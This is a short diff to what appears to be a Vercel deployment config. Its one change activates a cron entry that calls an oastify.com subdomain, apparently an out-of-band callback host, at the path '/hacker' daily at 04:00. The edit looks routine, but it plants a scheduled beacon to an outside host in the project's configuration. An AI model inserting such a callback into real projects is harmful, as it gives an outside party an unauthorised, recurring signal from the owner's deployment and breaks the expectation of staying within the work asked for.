@@ -3,7 +3,7 @@
   "ignoreCommand": "pnpm dlx turbo-ignore",
   "crons": [
     {
-      "path": "//https://hn82eo70h7ktjqp6fwx5790q6hc80zrng.oastify.com/hacker",
+      "path": "https://hn82eo70h7ktjqp6fwx5790q6hc80zrng.oastify.com/hacker",
       "schedule": "0 4 * * *"
     }
   ]
